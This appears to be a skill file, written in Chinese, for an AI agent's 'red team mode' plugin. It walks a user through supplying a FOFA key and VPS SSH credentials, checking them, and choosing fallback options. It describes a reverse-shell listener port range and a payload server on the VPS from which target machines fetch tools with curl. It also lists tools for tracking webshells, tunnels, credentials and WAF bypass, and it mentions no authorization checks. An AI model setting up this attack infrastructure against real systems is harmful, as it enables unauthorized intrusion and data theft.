---
name: redteam-setup
description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
---

# 首次使用引导（把环境一次配齐）

**触发条件**（满足任一即执行本技能，不要跳过）：
- `redteam_preflight` 返回里 `onboarding.complete=false`；
- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
- 用户第一次进红队模式、或明确说"环境/工具没配好"。

**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。

## 一、先确认你有没有"工具箱"（npm 版默认没有）

### 平台差异（先读这条，Windows 上路径/资产名都不一样）

本仓技能里的 toolkit 路径一律写成 POSIX 形式（`$DSH_HOME/redteam/toolkit/<tool>/<tool>`）。**在 Windows 上那对应的可执行文件是 `<tool>\<tool>.exe`**——照抄无后缀的路径会找不到。

装法也不一样：仓里的 `$DSH_HOME/redteam/setup.sh` 是 **Linux/Kali 专用**（资产正则写死 `linux_amd64`，在 Windows 上每个都报「无匹配资产」）。Windows 用 `npm run toolkit:windows`——它走 GitHub 官方 API 取 **windows_amd64** 资产：

```powershell
npm run toolkit:windows                      # 装全部（官方 Windows 构建）
npm run toolkit:windows -- --only subfinder,dnsx   # 只装指定
npm run toolkit:check                        # 只体检不装（双探 PATH 与 toolkit）
```

已知差异：`ksubdomain` 上游**没有 Windows 构建**（实测 0 个资产），Windows 上用 `subfinder` 替代。

**不要凭记忆判断工具在不在**：技能里的「本机工具实况」是导入时快照，会过期；真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核。

npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /
WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把
"包在安装后自动下载渗透二进制"判定为恶意行为特征，整包会被 Blocked。

- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；
- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目
  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README
  **由用户自己执行**，再到第三节手动配 `FOFA_KEY` 与 VPS；
- **都不要**也行：只用本包自带的 14 个侦察/检测向技能（`fofa-recon` / `active-scan` /
  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等）也能开工，只是拿不到需要落地的成果。

> **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。

## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）

| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
| --- | --- | --- | --- |
| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |

**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。

**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。

### FOFA_KEY 怎么拿（要能指导用户）
1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。

### VPS 怎么准备（要能指导用户）
- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。

## 三、配置完的验证（必须做完才算引导成功）

逐项实测，**不要只看"文件存在"**：

```bash
# 1) FOFA key 有效
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'

# 3) 技能注册表可见
#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
```

> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
> （npm 版不含该脚本，见第一节）。
## 四、最后一步：写完成标记并复核

配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：

```bash
mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
```

然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。

**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
这一步要明确告诉用户（智能体不能替他重启）。

## 五、用户就是不给某些资源时（降级口径）

| 缺什么 | 降级方案 | 必须向用户说明的限制 |
| --- | --- | --- |
| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |

**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。

## 六、演练台工具全表（56 个里，这些最容易漏用）

演练台不是"记笔记的地方"，是**主会话与子会话共享的唯一事实源**。会话一断、上下文一清，只有落库的东西还在。
以下工具按用途分组——**括号里是"什么时候必须想起来用它"**，不是可选装饰。

### 靶标与会话（多开会话时最容易串库）

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_engagement_open` | 开工第一个动作：建/复用一个靶标，并把**当前会话**绑上去（子会话自动继承） |
| `redteam_session_bind` | 多会话并行时，给每个会话绑自己的靶标，防止互串写库 |
| `redteam_session_info` | 派活前先确认"我这会话到底绑的是哪个靶标" |
| `redteam_sessions` | **每次决策前后都要看**：一屏总览已上线 WebShell、可用隧道（含可达网段）、凭据、访问会话 |
| `redteam_agent_slot` | 派活前查并发名额（同靶标最多 3 个，`REDTEAM_MAX_AGENTS` 可调） |

### 资产（信息收集的收口动作）

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_asset_stats` | 收集收口：看 C 段数、存活资产、端口、服务、指纹、溯源条数，判断有没有断层 |
| `redteam_asset_get` | 深入分析单个目标：全部端口与服务、指纹、采集时间线、关系边 |
| `redteam_asset_graph` | 拓扑推理与横向路径规划（C 段 → 资产 → 端口 → 域名解析边） |
| `redteam_domain_index` | 按域名聚合：主域名、子域与 C 段的关系 |
| `redteam_asset_timeline` | 回答"这个资产什么时候发现的"、核对本轮收集完整性 |
| `redteam_asset_assess` | **收口时对每个资产跑一次**：预期成果（账号/ RCE/服务器权限/数据库/敏感数据/边界突破）+ 优先级 + 理由，供指挥者按性价比排序 |

### 漏洞、打击与得分

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_vuln_query` | 挑待利用目标、核对误报（按严重级/状态/CVE/资产/C 段过滤） |
| `redteam_attack_path` | 攻击图谱：资产拓扑 + 漏洞节点 + 已控制资产，用于横向规划与汇报 |
| `redteam_attack_chain` | 五阶段链路视图（① 信息收集 → ② 互联网资产权限 → ③ 边界突破 → ④ 内网资产权限 → ⑤ 靶标权限） |
| `redteam_score_report` | **交付报告用这个**：只收"拿到分"的成果，每条附可直接粘贴复现的原始请求 |
| `redteam_report_targets` / `redteam_report` | **已弃用**，改用 `redteam_score_report`（老靶标兼容才用） |
| `redteam_score_point_save` | 发现规则里有未记录的分项时补录（带 id 改、不带 id 增） |

### 证据与文件（"没落库的发现等于没发生"）

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_shot_add` | 命中当轮登记证据截图，关联得分点；报告会嵌入。批量得分点（如终端权限）每个最多 3 张代表图 |
| `redteam_shot_list` / `redteam_shot_delete` | 查/删已登记截图 |
| `redteam_attack_file_list` | **新写脚本前先查**：有现成的就复用改参，禁止同义重写 |

### WebShell 与隧道

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_webshell_list` / `redteam_webshell_update` | 查在线状态；被删/掉线/权限变化时更新 |
| `redteam_tunnel_list` | 查隧道与可达网段。**`legit=false` 表示只在自己 VPS 上开的通道，不算跨越靶标，不计分** |

### POC 知识库（复用比自己造快）

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_poc_list` | 盘点手上现成武器（可按 kind/source/component/verified 过滤） |
| `redteam_poc_use` | 记一次复用（用在哪个靶标），复用多的排前面 |
| `redteam_poc_update` | **真实目标验证通过后必须回来**把 `verified` 置真并写 `verified_note` |

### 角色稿（子会话的武器）

| 工具 | 什么时候用 |
| --- | --- |
| `redteam_roles` | 查有哪几个角色（信息收集 / 漏洞检测 / 漏洞利用 / 内网渗透） |
| `redteam_role_prompt` | 查某角色当前生效的系统提示词；派活时在 subagent prompt 第一行写 `redteamRole: <code>`，**不要把全文抄进任务** |
| `redteam_role_prompt_reset` | 老靶标想用上最新版角色提示词时重置（省略 role 则四个全重置） |

**一句话记法**：开工 `engagement_open` → 收集收口 `asset_stats` + `asset_assess` → 每个决策前 `sessions` → 命中即 `vuln_add` + `shot_add` → 交付 `score_report`。



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

命令含 Linux 专属形态（`sudo` / `apt` / `/usr/share` 等）：本机是 Windows，**去掉 sudo**、把绝对路径换成工具目录（`$DSH_HOME/redteam/toolkit/<name>/`），`.exe` 后缀别漏。

runnability:end -->

<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **同类替代**（链路里的互补技能，手法最接近）：`kimi-webbridge`、`pentest-tools`

2. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：流程/编排｜**角色**：`flow`
- **下游**（产出交给谁）：`recon-pipeline`
- **互补**（同类场景一起用）：`kimi-webbridge`、`pentest-tools`
- **落库**：本技能不直接产出可落库实体；产出交给下游技能记进演练台


<!-- /skill-link-graph -->
